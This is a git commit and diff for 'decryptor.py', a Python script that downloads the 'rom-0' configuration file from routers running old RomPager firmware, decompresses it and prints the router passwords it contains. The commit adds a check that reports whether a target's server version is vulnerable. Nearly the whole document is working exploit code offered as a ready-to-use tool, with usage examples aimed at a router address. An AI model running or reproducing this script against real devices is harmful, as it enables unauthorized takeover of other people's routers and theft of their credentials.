ffacf63f9b13004710b17e365e6a205f7fb175f2
John Doe <jd@DESKTOP-8X9SADF.company.local>
2024-10-26 15:31:22 +0500

    Add check for vulnerable server version, move main code under __main__

--- decryptor.py
+++ decryptor.py
@@ -7,6 +7,12 @@ import requests
 import re
 import sys
 
+def check_vuln(url):
+    h = requests.get(f'{url}').headers
+    serverName = h["Server"].split(' ')[0].split('/')[0]
+    serverVersion = h["Server"].split(' ')[0].split('/')[1]
+    return serverName.lower() == "rompager" and float(serverVersion) < 4.34
+
 def get_rom(url):
     print('Downloding..')
     r = requests.get(f'{url}/rom-0')
@@ -21,33 +27,37 @@ def extract_password(data):
     fpos = 8568
     result, window=LZSDecompress(data[fpos:])
     print('Decompression in progress...')
-    #print(f"Decompressed strings: {result}")
     
 
     q = re.findall("([\040-\176]{5,})", result)
-    if q:
-        return q[0]
+    print("Possible passwords:")
+    for i in range(len(q)):
+        print(q[i])
 
 
-if sys.argv[1]=="help":
-    print("""
-    Usage: 
-        python3 decryptor.py get "http://192.168.1.1"
-        python3 decryptor.py decrypt <FILENAME>
-    """)
-    pass
-elif sys.argv[1]=="get":
-    get_rom(sys.argv[2])
-elif sys.argv[1]=="decrypt":
-    if sys.argv[2]:
-        fname = sys.argv[2]
-    with open(fname, 'rb') as f:
-        print("Router password is: " + '\t' + extract_password(f.read()))
+if __name__ == "__main__":
+    if sys.argv[1]=="help":
+        print("""
+        Usage: 
+            python3 decryptor.py get "http://192.168.1.1"
+            python3 decryptor.py decrypt <FILENAME>
+            pyhton3 decryptor.py check "http://192.168.1.1"
+        """)
+        pass
+    elif sys.argv[1]=="get":
+        get_rom(sys.argv[2])
+    elif sys.argv[1]=="decrypt":
+        if sys.argv[2]:
+            fname = sys.argv[2]
+        with open(fname, 'rb') as f:
+            extract_password(f.read())
+    elif sys.argv[1] == "check":
+        if check_vuln(sys.argv[2]):
+            print(f"{sys.argv[2]} is VULNERABLE")
+        else:
+            print(f"{sys.argv[2]} is NOT VULNERABLE")
 
-else:
-    print("""
-        python3 decryptor.py --help  FOR USAGE
-    """)
-
-
-
+    else:
+        print("""
+            python3 decryptor.py --help  FOR USAGE
+        """)
